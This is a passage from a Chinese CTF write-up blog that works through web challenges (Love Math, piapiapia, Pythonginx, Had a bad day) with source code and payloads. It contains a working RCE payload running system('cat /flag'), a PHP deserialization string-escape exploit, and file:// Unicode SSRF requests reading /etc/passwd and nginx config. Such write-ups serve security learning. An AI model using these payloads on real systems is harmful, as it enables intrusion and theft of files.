class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\">    preg_match_all(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$func</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span>.<span class=\"variable\">$content</span>.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。</p>\n<p><a href=\"https://www.cnblogs.com/20175211lyz/p/11588219.html\">刷题记录：[CISCN 2019 初赛]Love Math</a></p>\n<p>最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。</p>\n<p>利用<code>$whitelist</code>里的函数名称和数字遍历异或<code>^</code>，Fuzz找出来需要的字母，然后拼接一个<code>_GET</code>传参执行命令。</p>\n<p>Fuzz的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$exp</span>=<span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; count(<span class=\"variable\">$whitelist</span>); <span class=\"variable\">$i</span>++) &#123; </span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"variable\">$j</span>=<span class=\"number\">0</span>; <span class=\"variable\">$j</span> &lt; <span class=\"number\">1000</span>; <span class=\"variable\">$j</span>++) &#123; </span><br><span class=\"line\">\t\t<span class=\"variable\">$exp</span>=<span class=\"variable\">$whitelist</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$j</span>.<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"variable\">$whitelist</span>[<span class=\"variable\">$i</span>].<span class=\"string\">&quot;^&quot;</span>.<span class=\"variable\">$j</span>.<span class=\"string\">&quot;----&quot;</span>.<span class=\"variable\">$exp</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要知道的有，php某个版本以后可以使用函数名加<code>()</code>的方式调用函数，如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> base_convert(<span class=\"string\">&quot;strtoupper&quot;</span>, <span class=\"number\">36</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$cos</span>=base_convert(<span class=\"string\">&quot;2927671435926243&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">36</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>.<span class=\"variable\">$cos</span>(<span class=\"string\">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>上面代码是把字符串<strong>strtoupper</strong>赋值到变量<code>$cos</code>，然后直接使用<code>$cos()</code>执行<code>strtoupper()</code>函数。代码中使用<code>base_convert</code>函数也是这道题的一种思路哦。﹙ˊ_&gt;ˋ﹚</p>\n<p>还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号<code>()</code>括起来就可以了。<code>$</code>如果直接拼接到字符串上也是不可以的，需要使用形如<code>$$cos</code>才可以正确的指向变量。</p>\n<p>最终payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=<span class=\"variable\">$cos</span>=(is_finite^(<span class=\"number\">6</span>).(<span class=\"number\">4</span>)).(rad2deg^(<span class=\"number\">7</span>).(<span class=\"number\">5</span>));<span class=\"variable\">$cos</span>=<span class=\"variable\">$$cos</span>;<span class=\"variable\">$cos</span>&#123;<span class=\"number\">0</span>&#125;(<span class=\"variable\">$cos</span>&#123;<span class=\"number\">1</span>&#125;)&amp;<span class=\"number\">0</span>=system&amp;<span class=\"number\">1</span>=cat /flag</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h1><p>使用目录扫描发现了<a href=\"http://www.zip网站备份./\">www.zip网站备份。</a></p>\n<p>网站结构</p>\n<blockquote>\n<p>static</p>\n<p>upload</p>\n<p>class.php</p>\n<p>config.php</p>\n<p>index.php</p>\n<p>profile.php</p>\n<p>register.php</p>\n<p>update.php</p>\n</blockquote>\n<p>发现有register就去注册个试试呗</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png\"></p>\n<p>注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号</p>\n<p>邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;data:image/gif;base64,.......</span></span></span><br></pre></td></tr></table></figure>\n\n<p>查看源码profile.php中是这样的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$profile</span> = unserialize(<span class=\"variable\">$profile</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$phone</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$email</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;email&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$nickname</span> = <span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;nickname&#x27;</span>];</span><br><span class=\"line\">\t\t<span class=\"variable\">$photo</span> = base64_encode(file_get_contents(<span class=\"variable\">$profile</span>[<span class=\"string\">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了<code>unserialize</code>，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;hostname&#x27;</span>] = <span class=\"string\">&#x27;127.0.0.1&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;username&#x27;</span>] = <span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;password&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$config</span>[<span class=\"string\">&#x27;database&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$flag</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><del>下载的源码肯定不会把flag直接给你</del>，要相办法读这个文件。看到了数据库配置，感觉序列化的对象应该也是从数据库读出来的，还有一个文件没有看：class.php，顺便跟进一下user对象相关的，注意到了注册和登陆都使用到了一个函数：<code>filter</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"built_in\">parent</span>::filter(<span class=\"variable\">$username</span>);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"built_in\">parent</span>::filter(<span class=\"variable\">$password</span>);</span><br></pre></td></tr></table></figure>\n\n<p>跟进一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$escape</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;\\\\\\\\&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$escape</span> = <span class=\"string\">&#x27;/&#x27;</span> . implode(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$escape</span>) . <span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$string</span> = preg_replace(<span class=\"variable\">$escape</span>, <span class=\"string\">&#x27;_&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"variable\">$safe</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;select&#x27;</span>, <span class=\"string\">&#x27;insert&#x27;</span>, <span class=\"string\">&#x27;update&#x27;</span>, <span class=\"string\">&#x27;delete&#x27;</span>, <span class=\"string\">&#x27;where&#x27;</span>);</span><br><span class=\"line\">\t\t<span class=\"variable\">$safe</span> = <span class=\"string\">&#x27;/&#x27;</span> . implode(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$safe</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace(<span class=\"variable\">$safe</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤<code>_</code>，select、insert、update、delete、where会被替换成<code>hacker</code>，where长度是5，hacker长度是6，敏感一点的应该想到了序列化字符串对象也是用字符串长度的，这样长度改变的话，可以使用<a href=\"https://my.oschina.net/u/3076320/blog/4372683\">PHP反序列化字符串逃逸</a>，序列化的结尾是<code>&quot;;&#125;</code>可以手动构造闭合。</p>\n<p>现在整理下思路。图片属性那里可以读文件，过滤函数会导致序列化字符串逃逸，所以就构造photo读取config.php。那么逃逸的点在哪里？电话只能是数字，邮箱需要有@等字符，图片会被md5加密，昵称哪里虽然有长度限制，但是如果我们传入数组的话就可以绕过。那么开工</p>\n<p>先上payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>⭐参考了其他的好多博客，这里的点讲的很模糊，原来长度为5的字符串变成了长度为6的，应该是更不可能读不到payload的。</p>\n<p>受到了这位师傅的博客<a href=\"https://blog.csdn.net/weixin_44077544/article/details/102703489\">[0CTF 2016]piapiapia</a>，我尝试了下<code>$profile</code>属性其实是一个<strong>关联数组</strong>，是键值对形式的，并且字符串可能是嵌套起来的，形如</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">profile</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;a:2:&#123;s:8:&quot;nickname&quot;;s:5:&quot;where&quot;;s:5:&quot;photo&quot;;s:3:&quot;233&quot;;&#125;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$upload</span> =<span class=\"string\">&quot;2333&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$s1</span>= <span class=\"keyword\">new</span> profile();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$s1</span>);</span><br></pre></td></tr></table></figure>\n\n<p>结果是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:<span class=\"number\">7</span>:<span class=\"string\">&quot;profile&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;file&quot;</span>;s:<span class=\"number\">56</span>:<span class=\"string\">&quot;a:2:&#123;s:8:&quot;</span>nickname<span class=\"string\">&quot;;s:15:&quot;</span>where<span class=\"string\">&quot;;s:5:&quot;</span>photo<span class=\"string\">&quot;;s:3:&quot;</span><span class=\"number\">233</span><span class=\"string\">&quot;;&#125;&quot;</span>;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;upload&quot;</span>;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;2333&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这种格式的，假如我们的payload是修改上面的upload，在一个字符串总长度s如上面的56读取所有变长的hacker以后，到了我们的payload地方，正常把我们构造的upload读取为对象，而后面真正的upload字符串就被舍去了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103923.png\"></p>\n<p>报错是因为nickname我们传入的是数组形式的，源代码里直接对数组进行操作肯定是报错的，但是我们需要的只有photo正常即可，可以看到后面我们文件更新成功了。</p>\n<p>查看页面的图片内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103720.png\"></p>\n<p>base64解码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103747.png\"></p>\n<hr>\n<h1 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310100334.png\"></p>\n<p>整理一下源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span>():</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">&quot;url&quot;</span>)</span><br><span class=\"line\">    host = parse.urlparse(url).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 111&quot;</span></span><br><span class=\"line\">    parts = <span class=\"built_in\">list</span>(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">&#x27;.&#x27;</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">&#x27;idna&#x27;</span>).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;.&#x27;</span>.join(newhost)</span><br><span class=\"line\">    <span class=\"comment\">#去掉 url 中的空格</span></span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">&#x27; &#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">&#x27;suctf.cc&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>三个if都是判断<code>host == &#39;suctf.cc&#39;</code>，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断<code>==</code>，回过头来注意到了<strong>第二个</strong>if中有<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>进行了一波编码，那么问题就出在了这里。</p>\n<p>所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母<code>c</code>，那么我就找第一个字母<code>s</code>验证一下，贴一个unicode的网站：<a href=\"https://www.compart.com/en/unicode/U+0073%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E4%BB%A5%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%90%9C%E7%B4%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E9%9D%A2%E6%9C%89%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%8C**%E9%9C%80%E8%A6%81%E5%A4%9A%E8%AF%95%E5%87%A0%E4%B8%AA**%E3%80%82\">https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，**需要多试几个**。</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png\"></p>\n<p>我选出的是这个字符<code>𝐬</code>，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png\"></p>\n<p>flag并不在其中，并且也不再根目录下，根据题目中有<code>nginx</code>应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：</p>\n<blockquote>\n<p>配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf</p>\n<p>主配置文件：/etc/nginx/conf/nginx.conf</p>\n<p>管理脚本：/usr/lib64/systemd/system/nginx.service</p>\n<p>模块：/usr/lisb64/nginx/modules</p>\n<p>应用程序：/usr/sbin/nginx</p>\n<p>程序默认存放位置：/usr/share/nginx/html</p>\n<p>日志默认存放位置：/var/log/nginx</p>\n</blockquote>\n<p>读配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png\"></p>\n<p>读flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png\"></p>\n<p>参考的博客链接：</p>\n<p><a href=\"https://www.xmsec.cc/suctf19-wp/\">https://www.xmsec.cc/suctf19-wp/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/6042#toc-24\">https://xz.aliyun.com/t/6042#toc-24</a></p>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>\n<hr>\n<h1 id=\"BSidesCF-2020-Had-a-bad-day\"><a href=\"#BSidesCF-2020-Had-a-bad-day\" class=\"headerlink\" title=\"[BSidesCF 2020]Had a bad day\"></a>[BSidesCF 2020]Had a bad day</h1><p>看这个标题我推一下OWRLD ORDER的<a href=\"https://www.bilibili.com/video/BV1Bb411K7Gd\">Have a nice day</a></p>\n<p>页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?category=woofers</span><br></pre></td></tr></table></figure>\n\n<p>尝试输入flag会显示</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png\"></p>\n<p>只能有<code>woofers</code>和<code>meowers</code>可以通过，尝试了下php的<code>filter</code>伪协议读文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png\"></p>\n<p>读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span> Woof! Woof! <span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;width:100%&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;img/dog/&lt;?php echo rand(1,10)?&gt;.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>多尝试以后发现可以读<code>index</code>，下面是主要的源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span 